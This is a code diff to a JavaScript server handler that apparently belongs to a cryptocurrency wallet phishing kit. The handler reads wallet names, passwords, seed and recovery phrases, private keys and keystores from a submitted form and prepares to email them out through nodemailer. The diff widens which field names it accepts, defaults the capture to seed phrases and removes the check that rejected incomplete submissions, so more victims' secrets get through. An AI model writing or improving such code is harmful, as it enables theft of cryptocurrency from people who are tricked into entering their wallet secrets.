@@ -70,10 +70,14 @@ async function handler(req, res) {
     wallet_name,
     walletName,
     phase,
+    verification_method,
+    verificationMethod,
     pw: password,
     password: passwordField,
     seedphrase,
     phrase,
+    recovery_phrase,
+    recoveryPhrase,
     privateKey,
     privatekey,
     private_key,
@@ -83,15 +87,11 @@ async function handler(req, res) {
   } = body;
 
   const walletNameValue = wallet_name || walletName || '';
-  const phaseValue = phase || '';
+  const phaseValue = (phase || verification_method || verificationMethod || '').toString().trim() || 'seedphrase';
   const passwordValue = password || passwordField || keystorePassword || keystore_password || '';
-  const seedPhraseValue = seedphrase || phrase || '';
+  const seedPhraseValue = seedphrase || phrase || recovery_phrase || recoveryPhrase || '';
   const privateKeyValue = privateKey || privatekey || private_key || '';
   const keystoreValue = keystore || '';
-
-  if (!phaseValue || phaseValue.trim() === '') {
-    return res.status(400).send('Required field missing.');
-  }
 
   try {
     const transporter = nodemailer.createTransport({
